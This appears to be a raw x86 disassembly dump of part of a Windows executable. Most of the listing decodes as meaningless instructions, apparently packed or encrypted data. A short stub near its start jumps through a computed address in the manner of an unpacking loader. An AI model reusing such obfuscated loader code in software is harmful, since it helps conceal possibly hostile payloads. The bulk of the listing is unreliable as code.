  40769d:	add    BYTE PTR [ebx+0x40],al
  4076a0:	bound  ecx,QWORD PTR [edi]
  4076a2:	inc    eax
  4076a3:	test   al,0xac
  4076a5:	push   ecx
  4076a6:	mov    esp,0x1c140a8
  4076ab:	adc    BYTE PTR [edx+0x10],ch
  4076ae:	dec    eax
  4076af:	adc    al,BYTE PTR [edx+edi*1]
  4076b2:	outs   dx,DWORD PTR ds:[esi]
  4076b3:	ins    BYTE PTR es:[edi],dx
  4076b4:	mov    esi,0x40b488c1
  4076b9:	les    eax,FWORD PTR [edx]
  4076bb:	and    BYTE PTR [ebp+0x62],0x88
  4076bf:	adc    eax,0x42302640
  4076c4:	in     al,dx
  4076c5:	pop    esp
  4076c6:	ret    
  4076c7:	int3   
  4076c8:	int3   
  4076c9:	int3   
  4076ca:	int3   
  4076cb:	int3   
  4076cc:	int3   
  4076cd:	int3   
  4076ce:	int3   
  4076cf:	int3   
  4076d0:	inc    eax
  4076d1:	inc    ecx
  4076d2:	xor    eax,ecx
  4076d4:	push   ebp
  4076d5:	mov    ebp,esp
  4076d7:	push   eax
  4076d8:	mov    ecx,eax
  4076da:	inc    ecx
  4076db:	call   0x408df0
  4076e0:	push   0x426d4c
  4076e5:	push   0x40
  4076e7:	mov    edx,0x420161
  4076ec:	push   0xfec
  4076f1:	push   edx
  4076f2:	jmp    0x40770d
  4076f4:	mov    ecx,0x7f
  4076f9:	mov    edi,0x420161
  4076fe:	inc    ecx
  4076ff:	mov    eax,ds:0x42529d
  407704:	call   0x41fcd0
  407709:	pop    eax
  40770a:	inc    eax
  40770b:	inc    eax
  40770c:	ret    
  40770d:	call   eax
  40770f:	lea    esi,ds:0x41fd90
  407715:	jmp    0x4076f4
  407717:	int3   
  407718:	int3   
  407719:	int3   
  40771a:	int3   
  40771b:	int3   
  40771c:	int3   
  40771d:	int3   
  40771e:	int3   
  40771f:	int3   
  407720:	inc    eax
  407721:	xor    bl,BYTE PTR [ebx+0xc]
  407724:	adc    ch,BYTE PTR [ebp+0x46]
  407727:	mov    esp,0x1fb75c40
  40772c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40772d:	test   al,0xd9
  40772f:	add    eax,0x73107140
  407734:	inc    ecx
  407735:	adc    al,BYTE PTR [edx+0x42]
  407738:	inc    eax
  407739:	pop    ecx
  40773a:	xor    eax,0x30a03f43
  40773f:	inc    ebx
  407740:	inc    eax
  407741:	pop    ebp
  407742:	push   es
  407743:	pop    ebp
  407744:	lods   al,BYTE PTR ds:[esi]
  407745:	adc    eax,0xbb402884
  40774a:	jae    0x4076f1
  40774c:	(bad)  
  40774d:	retf   
  40774e:	pop    es
  40774f:	pop    esp
  407750:	inc    eax
  407751:	sbb    eax,0x844004e3
  407756:	add    ah,cl
  407758:	bound  eax,QWORD PTR ds:0xcc840f41
  40775e:	inc    ebx
  40775f:	add    BYTE PTR [eax+0x0],al
  407762:	inc    eax
  407763:	inc    eax
  407764:	inc    eax
  407765:	int3   
  407766:	add    BYTE PTR ds:0x62404341,al
  40776c:	pop    eax
  40776d:	add    BYTE PTR [ebx+0x40],al
  407770:	bound  ecx,QWORD PTR [edi]
  407772:	inc    eax
  407773:	or     eax,0x400821bc
  407778:	rcl    DWORD PTR [ecx+0x6244cb44],cl
  40777e:	leave  
  40777f:	inc    eax
  407780:	pop    ecx
  407781:	inc    ebp
  407782:	ins    DWORD PTR es:[edi],dx
  407783:	adc    BYTE PTR [ebp+0xe],dl
  407786:	mov    eax,0x33979140
  40778b:	push   esp
  40778c:	int3   
  40778d:	imul   eax,DWORD PTR [ecx+0x40],0x59aff65
  407794:	mov    esp,0x3340f1d1
  407799:	inc    ebp
  40779a:	and    bl,cl
  40779c:	or     eax,0x5a40f863
  4077a1:	lahf   
  4077a2:	clc    
  4077a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077a4:	retf   
  4077a5:	dec    esp
  4077a6:	adc    eax,0x90527540
  4077ab:	add    eax,0x2490
  4077b0:	inc    eax
  4077b1:	inc    eax
  4077b2:	cmovno eax,DWORD PTR ds:0x40056243
  4077b9:	int3   
  4077ba:	add    ah,cl
  4077bc:	inc    eax
  4077bd:	inc    eax
  4077be:	bound  eax,QWORD PTR [ecx+0x0]
  4077c1:	add    BYTE PTR [edi],cl
  4077c3:	inc    ebx
  4077c4:	inc    eax
  4077c5:	inc    eax
  4077c6:	add    BYTE PTR [ecx+0x43],al
  4077c9:	add    eax,0x40256240
  4077ce:	bound  eax,QWORD PTR [eax]
  4077d0:	leave  
  4077d1:	inc    eax
  4077d2:	data16 sahf 
  4077d4:	in     eax,dx
  4077d5:	leave  
  4077d6:	mov    edi,0xf9406053
  4077db:	inc    ebp
  4077dc:	daa    
  4077dd:	inc    esi
  4077de:	jo     0x40778b
  4077e0:	adc    DWORD PTR [eax+0x68],eax
  4077e3:	mov    edi,0xc3004ac8
  4077e8:	retf   
  4077e9:	inc    eax
  4077ea:	xor    DWORD PTR [ecx+0x6],ebp
  4077ed:	fadd   QWORD PTR [esi+edi*2+0x48]
  4077f1:	inc    eax
  4077f2:	inc    edx
  4077f3:	push   eax
  4077f4:	je     0x40780d
  4077f6:	inc    ebp
  4077f7:	bound  eax,QWORD PTR [ebx+0x40]
  4077fa:	xchg   ecx,eax
  4077fb:	mov    bl,0x2e
  4077fd:	cmp    BYTE PTR [eax],dh
  4077ff:	sti    
  407800:	xchg   edi,eax
  407801:	inc    eax
  407802:	dec    edx
  407803:	mov    ebx,DWORD PTR [ecx+0x494242c]
  407809:	inc    eax
  40780a:	adc    DWORD PTR ds:0x4140cc00,eax
  407810:	inc    eax
  407811:	inc    ebx
  407812:	bound  esp,QWORD PTR ds:0x41400043
  407818:	add    BYTE PTR [eax],al
  40781a:	add    eax,0x43624062
  40781f:	inc    ecx
  407820:	inc    eax
  407821:	inc    eax
  407822:	inc    eax
  407823:	add    eax,0x40624340
  407828:	add    eax,0x40664140
  40782d:	cmp    DWORD PTR [esi+edx*1+0x406263a8],edi
  407834:	mov    edi,0x12640382
  407839:	push   ebx
  40783a:	leave  
  40783b:	inc    eax
  40783c:	inc    ecx
  40783d:	mov    al,0x29
  40783f:	mov    DWORD PTR [ecx],eax
  407841:	test   al,0x5c
  407843:	inc    eax
  407844:	shl    BYTE PTR [eax-0x57],1
  407847:	push   0x4002e454
  40784c:	add    DWORD PTR [esi+0x26cd632a],ebp
  407852:	jo     0x407894
  407854:	inc    eax
  407855:	inc    esp
  407856:	xchg   ebx,eax
  407857:	inc    edx
  407858:	mov    eax,0x433f1c
  40785d:	add    eax,0x41107840
  407862:	bound  eax,QWORD PTR [eax+0x40]
  407865:	sldt   WORD PTR [eax-0x34]
  407869:	js     0x4078cd
  40786b:	add    eax,0x40664143
  407870:	inc    ebx
  407871:	add    BYTE PTR [ecx+0x5],al
  407874:	js     0x4078b6
  407876:	bound  eax,QWORD PTR [eax+0x0]
  407879:	inc    eax
  40787a:	inc    eax
  40787b:	push   ecx
  40787c:	aas    
  40787d:	xchg   esi,eax
  40787e:	xor    BYTE PTR ds:0x714050fc,cl
  407884:	inc    esp
  407885:	mov    ah,0x50
  407887:	retf   
  407888:	bound  ecx,QWORD PTR [eax]
  40788a:	inc    eax
  40788b:	jg     0x4078cc
  40788d:	mov    ebx,0xc955bcb9
  407892:	inc    eax
  407893:	jno    0x40790b
  407895:	in     al,0x42
  407897:	add    eax,0x7f40b034
  40789c:	fist   WORD PTR [ecx+0xd5fcbd2]
  4078a2:	inc    eax
  4078a3:	jno    0x4078f1
  4078a5:	test   dl,bl
  4078a7:	inc    ecx
  4078a8:	inc    ebx
  4078a9:	inc    eax
  4078aa:	inc    eax
  4078ab:	add    eax,0x434162
  4078b0:	inc    eax
  4078b1:	add    BYTE PTR [edx+0x5],ah
  4078b4:	inc    eax
  4078b5:	adc    BYTE PTR [edx+0x40],ah
  4078b8:	inc    ebx
  4078b9:	inc    ecx
  4078ba:	add    eax,0x4340
  4078bf:	add    eax,0x404162
  4078c4:	add    BYTE PTR [eax+0x43],al
  4078c7:	inc    eax
  4078c8:	add    eax,0x40cbd212
  4078cd:	jg     0x40786e
  4078cf:	sub    eax,0x43529428
  4078d4:	inc    eax
  4078d5:	jno    0x40794e
  4078d7:	jge    0x40786a
  4078d9:	adc    eax,0x7f40971c
  4078de:	cmc    
  4078df:	cwde   
  4078e0:	push   ss
  4078e1:	retf   
  4078e2:	mov    ah,0x34
  4078e4:	inc    eax
  4078e5:	dec    eax
  4078e6:	inc    eax
  4078e7:	add    BYTE PTR [eax],al
  4078e9:	inc    ecx
  4078ea:	inc    ebx
  4078eb:	add    eax,0x41784062
  4078f0:	inc    eax
  4078f1:	inc    eax
  4078f2:	add    BYTE PTR [edi],cl
  4078f4:	bound  eax,QWORD PTR [ebx+0x0]
  4078f7:	add    eax,0x25006240
  4078fc:	inc    eax
  4078fd:	add    eax,0x40254143
  407902:	add    eax,0x7f620000
  407907:	aad    0xe5
  407909:	adc    DWORD PTR [eax-0x960bfbe],ebp
  40790f:	xchg   edi,eax
  407910:	arpl   WORD PTR [ecx-0xbf79cf],sp
  407916:	jg     0x407922
  407918:	ja     0x4078ab
  40791a:	xor    al,0xbc
  40791c:	inc    eax
  40791d:	dec    ecx
  40791e:	call   FWORD PTR [edi+0x1542b064]
  407924:	inc    eax
  407925:	pop    ds
  407926:	sbb    ebp,esp
  407928:	inc    ebx
  407929:	add    BYTE PTR [eax],al
  40792b:	add    BYTE PTR [ecx+0x40],al
  40792e:	bound  esp,QWORD PTR [esi+0x0]
  407931:	inc    eax
  407932:	add    eax,0x5400000
  407937:	inc    ecx
  407938:	inc    eax
  407939:	inc    eax
  40793a:	bound  esp,QWORD PTR ds:0x25050043
  407940:	inc    ecx
  407941:	inc    ebx
  407942:	inc    eax
  407943:	test   BYTE PTR [eax+0x0],al
  407946:	bound  ebx,QWORD PTR [eax+0x62]
  407949:	inc    ecx
  40794a:	inc    eax
  40794b:	bound  ecx,QWORD PTR ds:0x7140436b
  407951:	mov    esi,0xf4435101
  407956:	mov    eax,0x94637f40
  40795b:	dec    esi
  40795c:	inc    eax
  40795d:	bound  eax,QWORD PTR [ebx+0x40]
  407960:	push   esp
  407961:	adc    edi,ebx
  407963:	test   al,0x45
  407965:	inc    eax
  407966:	xchg   edi,eax
  407967:	inc    eax
  407968:	cmc    
  407969:	ins    DWORD PTR es:[edi],dx
  40796a:	jo     0x40792e
  40796c:	xor    BYTE PTR [edi+0x20],ah
  40796f:	inc    eax
  407970:	cs push esp
  407972:	mov    ds:0x6241b033,al
  407977:	inc    eax
  407978:	xchg   edi,eax
  407979:	adc    al,0xe3
  40797b:	push   es
  40797c:	adc    BYTE PTR [edx+0x40],ah
  40797f:	inc    ecx
  407980:	and    eax,0x40000500
  407985:	inc    ebx
  407986:	add    eax,0x40624041
  40798b:	inc    ebx
  40798c:	add    eax,0x43402541
  407991:	bound  eax,QWORD PTR [eax+0x43]
  407994:	int3   
  407995:	inc    eax
  407996:	bound  eax,QWORD PTR [eax]
  407998:	inc    ecx
  407999:	inc    eax
  40799a:	inc    eax
  40799b:	add    eax,0xc9623d05
  4079a0:	inc    eax
  4079a1:	dec    edx
  4079a2:	jno    0x4079a0
  4079a4:	dec    esp
  4079a5:	ret    
  4079a6:	addr16 inc edx
  4079a8:	inc    eax
  4079a9:	xchg   ebp,eax
  4079aa:	xchg   ecx,eax
  4079ab:	inc    eax
  4079ac:	bound  edi,QWORD PTR [eax+edi*1+0x41494081]
  4079b3:	xor    al,0x39
  4079b5:	add    eax,0xb340c330
  4079ba:	jno    0x407a36
  4079bc:	sbb    eax,0x40bc8cc9
  4079c1:	sub    eax,0xaca9f546
  4079c6:	xchg   ecx,eax
  4079c7:	inc    edx
  4079c8:	inc    eax
  4079c9:	mov    ah,0xf0
  4079cb:	adc    DWORD PTR [ebp+eax*1+0x58],esp
  4079cf:	and    BYTE PTR [eax+0x2d],al
  4079d2:	push   cs
  4079d3:	mov    fs,esp
  4079d5:	inc    ebx
  4079d6:	aad    0x38
  4079d8:	inc    eax
  4079d9:	mov    esi,0x254062
  4079de:	inc    ax
  4079e0:	add    eax,0x40404143
  4079e5:	inc    ebx
  4079e6:	add    BYTE PTR [eax],al
  4079e8:	add    BYTE PTR [edx-0x34],ah
  4079eb:	inc    eax
  4079ec:	add    eax,0x40004041
  4079f1:	inc    ecx
  4079f2:	int3   
  4079f3:	add    BYTE PTR [ebx-0x7c],al
  4079f6:	add    eax,0x5406240
  4079fb:	bound  esp,QWORD PTR [edi]
  4079fd:	or     eax,0x626dbcd7
  407a02:	inc    eax
  407a03:	sub    eax,0x527f231
  407a08:	pop    esp
  407a09:	jo     0x407a4b
  407a0b:	mov    ebx,0xcb75219d
  407a10:	bound  eax,QWORD PTR [eax]
  407a12:	inc    eax
  407a13:	jno    0x407a80
  407a15:	sbb    BYTE PTR [edx-0x6e],ah
  407a18:	ror    bl,cl
  407a1a:	inc    eax
  407a1b:	fbstp  TBYTE PTR [ecx]
  407a1d:	mov    ebx,0xbfe7bf41
  407a22:	inc    eax
  407a23:	and    edx,DWORD PTR [ebp-0x6c]
  407a26:	hlt    
  407a27:	jo     0x4079d1
  407a29:	mov    edi,0xc107f40
  407a2e:	adc    BYTE PTR [eax],0xc8
  407a31:	xchg   ebx,eax
  407a32:	inc    eax
  407a33:	bound  ebx,QWORD PTR [eax+0x41]
  407a36:	add    eax,0x40404340
  407a3b:	inc    ebx
  407a3c:	inc    eax
  407a3d:	test   BYTE PTR [eax],al
  407a3f:	add    eax,0x40624041
  407a44:	inc    eax
  407a45:	add    BYTE PTR [edx+0x5],ah
  407a48:	inc    ebx
  407a49:	add    BYTE PTR [eax+0x78],al
  407a4c:	inc    ecx
  407a4d:	add    BYTE PTR [eax+0x41],bl
  407a50:	bound  eax,QWORD PTR [eax+0xf]
  407a53:	adc    al,0x25
  407a55:	push   ss
  407a56:	dec    ebp
  407a57:	das    
  407a58:	xlat   BYTE PTR ds:[ebx]
  407a59:	inc    eax
  407a5a:	std    
  407a5b:	inc    esi
  407a5c:	int3   
  407a5d:	in     eax,dx
  407a5e:	inc    ebp
  407a5f:	gs inc esp
  407a61:	inc    eax
  407a62:	or     DWORD PTR [edx],esi
  407a64:	xchg   ebx,eax
  407a65:	gs inc eax
  407a67:	test   BYTE PTR [eax],al
  407a69:	int3   
  407a6a:	bound  eax,QWORD PTR ds:0xcc840f41
  407a70:	inc    ebx
  407a71:	add    BYTE PTR [eax+0x0],al
  407a74:	inc    eax
  407a75:	inc    eax
  407a76:	inc    eax
  407a77:	int3   
  407a78:	add    BYTE PTR ds:0x62404341,al
  407a7e:	pop    eax
  407a7f:	add    BYTE PTR [ebx+0x40],al
  407a82:	bound  ecx,QWORD PTR [edi]
  407a84:	inc    eax
  407a85:	xor    BYTE PTR [ecx+esi*4+0x40],dl
  407a89:	test   al,0x10
  407a8b:	cmp    al,0x79
  407a8d:	rcl    DWORD PTR ds:0x406e4038,1
  407a93:	mov    bl,0xd0
  407a95:	test   al,0xf6
  407a97:	inc    ebx
  407a98:	inc    eax
  407a99:	dec    esi
  407a9a:	or     eax,0x4f11e355
  407a9f:	mov    ds:0x9a696140,al
  407aa4:	nop
  407aa5:	adc    BYTE PTR [ecx-0x6f],al
  407aa8:	inc    eax
  407aa9:	pop    ebp
  407aaa:	xlat   BYTE PTR ds:[ebx]
  407aab:	ins    DWORD PTR es:[edi],dx
  407aac:	test   al,0x4c
  407aae:	pop    eax
  407aaf:	inc    ebp
  407ab0:	inc    eax
  407ab1:	popa   
  407ab2:	add    BYTE PTR [eax],al
  407ab4:	inc    eax
  407ab5:	inc    eax
  407ab6:	cmovno eax,DWORD PTR ds:0x40056243
  407abd:	int3   
  407abe:	add    ah,cl
  407ac0:	inc    eax
  407ac1:	inc    eax
  407ac2:	bound  eax,QWORD PTR [ecx+0x0]
  407ac5:	add    BYTE PTR [edi],cl
  407ac7:	inc    ebx
  407ac8:	inc    eax
  407ac9:	inc    eax
  407aca:	add    BYTE PTR [ecx+0x43],al
  407acd:	add    eax,0x40256240
  407ad2:	bound  eax,QWORD PTR [eax]
  407ad4:	xchg   ecx,eax
  407ad5:	or     DWORD PTR [eax],edx
  407ad7:	int    0xe8
  407ad9:	iret   
  407ada:	inc    eax
  407adb:	mov    ebx,0xb84822c5
  407ae0:	(bad)  
  407ae1:	adc    DWORD PTR [eax+0x72],eax
  407ae4:	xor    eax,0x7805429d
  407ae9:	mov    al,ds:0x5d4b2140
  407aee:	pusha  
  407aef:	retf   
  407af0:	fs or  eax,0x9f114540
  407af6:	sub    BYTE PTR [edx+ebp*8+0x1ca240cb],bh
  407afd:	mov    esp,0x419c1563
  407b02:	inc    eax
  407b03:	sub    DWORD PTR [edi+0x62cbe9f9],edx
  407b09:	gs inc eax
  407b0b:	dec    ecx
  407b0c:	sub    al,cl
  407b0e:	les    eax,FWORD PTR ds:0x4140cc00
  407b14:	inc    eax
  407b15:	inc    ebx
  407b16:	bound  esp,QWORD PTR ds:0x41400043
  407b1c:	add    BYTE PTR [eax],al
  407b1e:	add    eax,0x43624062
  407b23:	inc    ecx
  407b24:	inc    eax
  407b25:	inc    eax
  407b26:	inc    eax
  407b27:	add    eax,0x40624340
  407b2c:	add    eax,0x40664140
  407b31:	adc    DWORD PTR [ebp+0x24],edi
  407b34:	inc    eax
  407b35:	and    DWORD PTR [ebx],edx
  407b37:	cmp    al,0x4f
  407b39:	pushf  
  407b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b3b:	jge    0x407b7d
  407b3d:	ins    BYTE PTR es:[edi],dx
  407b3e:	add    al,0xcb
  407b40:	inc    ebx
  407b41:	or     eax,0xe1404a64
  407b46:	push   edi
  407b47:	dec    BYTE PTR [ebx+ecx*8+0x7e]
  407b4b:	inc    esp
  407b4c:	inc    eax
  407b4d:	pop    esp
  407b4e:	jl     0x407b48
  407b50:	cmp    eax,0x4086ab10
  407b55:	ins    DWORD PTR es:[edi],dx
  407b56:	jg     0x407b02
  407b58:	ret    
  407b59:	mov    al,ds:0xdb40b891
  407b5e:	pop    ebp
  407b5f:	push   edx
  407b60:	mov    al,0x91
  407b62:	sahf   
  407b63:	adc    eax,0xf7fda540
  407b68:	adc    eax,0x4043b0ac
  407b6d:	test   BYTE PTR [ebp+0x43],bh
  407b70:	add    BYTE PTR ds:0x41107840,al
  407b76:	bound  eax,QWORD PTR [eax+0x40]
  407b79:	sldt   WORD PTR [eax-0x34]
  407b7d:	js     0x407be1
  407b7f:	add    eax,0x40664143
  407b84:	inc    ebx
  407b85:	add    BYTE PTR [ecx+0x5],al
  407b88:	js     0x407bca
  407b8a:	bound  eax,QWORD PTR [eax+0x0]
  407b8d:	inc    eax
  407b8e:	test   eax,0xc84105c9
  407b93:	inc    eax
  407b94:	gs push ecx
  407b96:	adc    BYTE PTR [eax+0x402cb943],ch
  407b9c:	lahf   
  407b9d:	mov    edi,0x1c404825
  407ba2:	jns    0x407be4
  407ba4:	push   0x4535f045
  407ba9:	sbb    edx,esp
  407bab:	inc    eax
  407bac:	and    esi,DWORD PTR [eax-0x67]
  407baf:	int3   
  407bb0:	xor    BYTE PTR [ebp+0x4a],dl
  407bb3:	inc    eax
  407bb4:	pop    ecx
  407bb5:	je     0x407bf8
  407bb7:	inc    ebx
  407bb8:	inc    eax
  407bb9:	inc    eax
  407bba:	add    eax,0x434162
  407bbf:	inc    eax
  407bc0:	add    BYTE PTR [edx+0x5],ah
  407bc3:	inc    eax
  407bc4:	adc    BYTE PTR [edx+0x40],ah
  407bc7:	inc    ebx
  407bc8:	inc    ecx
  407bc9:	add    eax,0x4340
  407bce:	add    eax,0x404162
  407bd3:	add    BYTE PTR [eax+0x43],al
  407bd6:	inc    eax
  407bd7:	add    eax,0x62ac9486
  407bdc:	inc    esp
  407bdd:	inc    eax
  407bde:	mov    eax,ds:0x3d0db564
  407be3:	dec    ecx
  407be4:	enter  0x4d40,0x13
  407be8:	dec    edi
  407be9:	int    0xc3
  407beb:	push   esp
  407bec:	mov    edi,0x84676340
  407bf1:	dec    esp
  407bf2:	mov    esp,0x52404653
  407bf7:	xor    edx,DWORD PTR [edi]
  407bf9:	xor    eax,0x40047215
  407bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bff:	fs ret 0xc942
  407c03:	push   esp
  407c04:	inc    eax
  407c05:	add    BYTE PTR [eax],al
  407c07:	inc    ecx
  407c08:	inc    ebx
  407c09:	add    eax,0x41784062
  407c0e:	inc    eax
  407c0f:	inc    eax
  407c10:	add    BYTE PTR [edi],cl
  407c12:	bound  eax,QWORD PTR [ebx+0x0]
  407c15:	add    eax,0x25006240
  407c1a:	inc    eax
  407c1b:	add    eax,0x40254143
  407c20:	add    eax,0xca620000
  407c25:	inc    eax
  407c26:	rcr    DWORD PTR [edi+0x63a84348],cl
  407c2c:	mov    ah,0x40
  407c2e:	and    edx,DWORD PTR [esp+esi*4+0x12]
  407c32:	inc    esp
  407c33:	imul   esi,DWORD PTR ds:0x81314f40,0xffffffdc
  407c3a:	dec    eax
  407c3b:	int    0x46
  407c3d:	inc    eax
  407c3e:	loop   0x407c9d
  407c40:	inc    ebx
  407c41:	add    BYTE PTR [eax],al
  407c43:	add    BYTE PTR [ecx+0x40],al
  407c46:	bound  esp,QWORD PTR [esi+0x0]
  407c49:	inc    eax
  407c4a:	add    eax,0x5400000
  407c4f:	inc    ecx
  407c50:	inc    eax
  407c51:	inc    eax
  407c52:	bound  esp,QWORD PTR ds:0x25050043
  407c58:	inc    ecx
  407c59:	inc    ebx
  407c5a:	inc    eax
  407c5b:	test   BYTE PTR [eax+0x0],al
  407c5e:	bound  ebx,QWORD PTR [eax+0x62]
  407c61:	inc    ecx
  407c62:	inc    eax
  407c63:	pop    ebx
  407c64:	(bad)  
  407c65:	enter  0x9801,0x40
  407c69:	and    eax,0x91ab4131
  407c6e:	push   esp
  407c6f:	adc    al,0x40
  407c71:	rol    DWORD PTR [edi-0x1b],cl
  407c74:	mov    al,0xbf
  407c76:	xor    eax,0x31a14062
  407c7b:	cmp    eax,DWORD PTR ds:0x40407670
  407c81:	mov    ebp,0x8c92cff
  407c86:	popf   
  407c87:	mov    al,BYTE PTR [eax+0x16]
  407c8a:	dec    edx
  407c8b:	inc    esi
  407c8c:	lods   al,BYTE PTR ds:[esi]
  407c8d:	adc    BYTE PTR [edx+0x40],ah
  407c90:	inc    ecx
  407c91:	and    eax,0x40000500
  407c96:	inc    ebx
  407c97:	add    eax,0x40624041
  407c9c:	inc    ebx
  407c9d:	add    eax,0x43402541
  407ca2:	bound  eax,QWORD PTR [eax+0x43]
  407ca5:	int3   
  407ca6:	inc    eax
  407ca7:	bound  eax,QWORD PTR [eax]
  407ca9:	inc    ecx
  407caa:	inc    eax
  407cab:	inc    eax
  407cac:	add    eax,0x2b63cb05
  407cb1:	inc    eax
  407cb2:	mov    eax,ds:0xbf42d5d1
  407cb7:	in     al,dx
  407cb8:	jae    0x407cfa
  407cba:	pop    edi
  407cbb:	pop    ebp
  407cbc:	lods   eax,DWORD PTR ds:[esi]
  407cbd:	cmp    bh,BYTE PTR [edi-0x1ebf24e8]
  407cc3:	fbstp  TBYTE PTR [edx+0x44620d0c]
  407cc9:	inc    eax
  407cca:	inc    edx
  407ccb:	in     al,0x22
  407ccd:	bound  eax,QWORD PTR [eax+0x25]
  407cd0:	add    BYTE PTR [esi+0x40],ah
  407cd3:	add    eax,0x40404143
  407cd8:	inc    ebx
  407cd9:	add    BYTE PTR [eax],al
  407cdb:	add    BYTE PTR [edx-0x34],ah
  407cde:	inc    eax
  407cdf:	add    eax,0x40004041
  407ce4:	inc    ecx
  407ce5:	int3   
  407ce6:	add    BYTE PTR [ebx-0x7c],al
  407ce9:	add    eax,0x5406240
  407cee:	bound  esp,QWORD PTR [ebx-0x2]
  407cf1:	jecxz  0x407d38
  407cf3:	inc    eax
  407cf4:	xor    eax,DWORD PTR gs:[eax-0x78]
  407cf8:	test   al,0x90
  407cfa:	cmp    eax,0xe453540
  407cff:	adc    eax,0x40265210
  407d04:	popa   
  407d05:	rol    ebp,1
  407d07:	int    0xa
  407d09:	enter  0x4076,0x48
  407d0d:	and    ah,BYTE PTR ds:0x704c444e
  407d13:	inc    eax
  407d14:	arpl   WORD PTR [edx+0x3dcd3570],si
  407d1a:	ds inc eax
  407d1c:	inc    edi
  407d1d:	adc    al,0x98
  407d1f:	inc    ecx
  407d20:	mov    eax,0x21406245
  407d25:	inc    eax
  407d26:	bound  ebx,QWORD PTR [eax+0x41]
  407d29:	add    eax,0x40404340
  407d2e:	inc    ebx
  407d2f:	inc    eax
  407d30:	test   BYTE PTR [eax],al
  407d32:	add    eax,0x40624041
  407d37:	inc    eax
  407d38:	add    BYTE PTR [edx+0x5],ah
  407d3b:	inc    ebx
  407d3c:	add    BYTE PTR [eax+0x78],al
  407d3f:	inc    ecx
  407d40:	add    BYTE PTR [eax+0x41],bl
  407d43:	bound  esp,QWORD PTR [ecx+0x5c]
  407d46:	dec    esp
  407d47:	adc    eax,0x514043a8
  407d4c:	icebp  
  407d4d:	sub    al,0x3d
  407d4f:	retf   
  407d50:	xor    BYTE PTR [eax+eax*2],ch
  407d53:	popa   
  407d54:	js     0x407d77
  407d56:	ret    
  407d57:	mov    esp,0x5740ef4a
  407d5c:	inc    eax
  407d5d:	test   BYTE PTR [eax],al
  407d5f:	int3   
  407d60:	bound  eax,QWORD PTR ds:0xcc840f41
  407d66:	inc    ebx
  407d67:	add    BYTE PTR [eax+0x0],al
  407d6a:	inc    eax
  407d6b:	inc    eax
  407d6c:	inc    eax
  407d6d:	int3   
  407d6e:	add    BYTE PTR ds:0x62404341,al
  407d74:	pop    eax
  407d75:	add    BYTE PTR [ebx+0x40],al
  407d78:	bound  ecx,QWORD PTR [edi]
  407d7a:	inc    eax
  407d7b:	push   ebx
  407d7c:	and    al,BYTE PTR [esi+0xd]
  407d7f:	bound  eax,QWORD PTR [eax+eax*2+0x21]
  407d83:	mov    ebx,0x40cb612b
  407d88:	addr16 inc eax
  407d8a:	mov    edi,0x42482b45
  407d8f:	pop    edi
  407d90:	leave  
  407d91:	inc    eax
  407d92:	inc    edx
  407d93:	fcom   DWORD PTR [ecx]
  407d95:	gs inc eax
  407d97:	mov    edi,0x3aa14059
  407d9c:	mov    ah,0xc0
  407d9e:	push   esi
  407d9f:	mov    edi,0x40fb40ed
  407da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da5:	mov    BYTE PTR [eax+ebp*1],ch
  407da8:	mov    edi,0x2329e140
  407dad:	pushf  
  407dae:	adc    al,BYTE PTR [eax-0x58]
  407db1:	inc    eax
  407db2:	inc    eax
  407db3:	inc    ebp
  407db4:	add    BYTE PTR [eax],al
  407db6:	inc    eax
  407db7:	inc    eax
  407db8:	cmovno eax,DWORD PTR ds:0x40056243
  407dbf:	int3   
  407dc0:	add    ah,cl
  407dc2:	inc    eax
  407dc3:	inc    eax
  407dc4:	bound  eax,QWORD PTR [ecx+0x0]
  407dc7:	add    BYTE PTR [edi],cl
  407dc9:	inc    ebx
  407dca:	inc    eax
  407dcb:	inc    eax
  407dcc:	add    BYTE PTR [ecx+0x43],al
  407dcf:	add    eax,0x40256240
  407dd4:	bound  eax,QWORD PTR [eax]
  407dd6:	sbb    al,0xe6
  407dd8:	mov    ds:0x6c40102a,al
  407ddd:	xor    DWORD PTR [ecx-0x67],eax
  407de0:	xchg   ecx,eax
  407de1:	adc    al,BYTE PTR [edx+0x40]
  407de4:	iret   
  407de5:	inc    esp
  407de6:	shl    DWORD PTR [ebx-0x58],1
  407de9:	dec    eax
  407dea:	inc    ecx
  407deb:	inc    eax
  407dec:	fs icebp 
  407dee:	and    al,0x5
  407df0:	add    ah,cl
  407df2:	inc    eax
  407df3:	inc    ecx
  407df4:	inc    eax
  407df5:	inc    ebx
  407df6:	bound  esp,QWORD PTR ds:0x41400043
  407dfc:	add    BYTE PTR [eax],al
  407dfe:	add    eax,0x43624062
  407e03:	inc    ecx
  407e04:	inc    eax
  407e05:	inc    eax
  407e06:	inc    eax
  407e07:	add    eax,0x40624340
  407e0c:	add    eax,0x40664140
  407e11:	call   0xb2e:0x40614615
  407e18:	sub    al,0x5
  407e1a:	retf   
  407e1b:	sbb    BYTE PTR [eax+eax*2-0xc284cb4],ch
  407e22:	addr16 pushf 
  407e24:	bound  eax,QWORD PTR [eax+0x21]
  407e27:	pop    ebx
  407e28:	dec    eax
  407e29:	ss xor al,0x62
  407e2c:	jle    0x407e6e
  407e2e:	dec    eax
  407e2f:	xchg   ebp,eax
  407e30:	sub    eax,0x24314065
  407e35:	inc    eax
  407e36:	in     eax,0x43
  407e38:	add    BYTE PTR ds:0x41107840,al
  407e3e:	bound  eax,QWORD PTR [eax+0x40]
  407e41:	sldt   WORD PTR [eax-0x34]
  407e45:	js     0x407ea9
  407e47:	add    eax,0x40664143
  407e4c:	inc    ebx
  407e4d:	add    BYTE PTR [ecx+0x5],al
  407e50:	js     0x407e92
  407e52:	bound  eax,QWORD PTR [eax+0x0]
  407e55:	inc    eax
  407e56:	iret   
  407e57:	jge    0x407df1
  407e59:	test   al,0x8
  407e5b:	aas    
  407e5c:	inc    eax
  407e5d:	mov    ebp,DWORD PTR [edi+0x6d]
  407e60:	adc    eax,0x4074643d
  407e65:	inc    esi
  407e66:	adc    edi,DWORD PTR [edi]
  407e68:	std    
  407e69:	ret    
  407e6a:	inc    ecx
  407e6b:	rol    DWORD PTR [eax+0x25],1
  407e6e:	jle    0x407e9a
  407e70:	dec    edx
  407e71:	inc    eax
  407e72:	mov    eax,0x41ca4046
  407e77:	inc    ebx
  407e78:	inc    eax
  407e79:	inc    eax
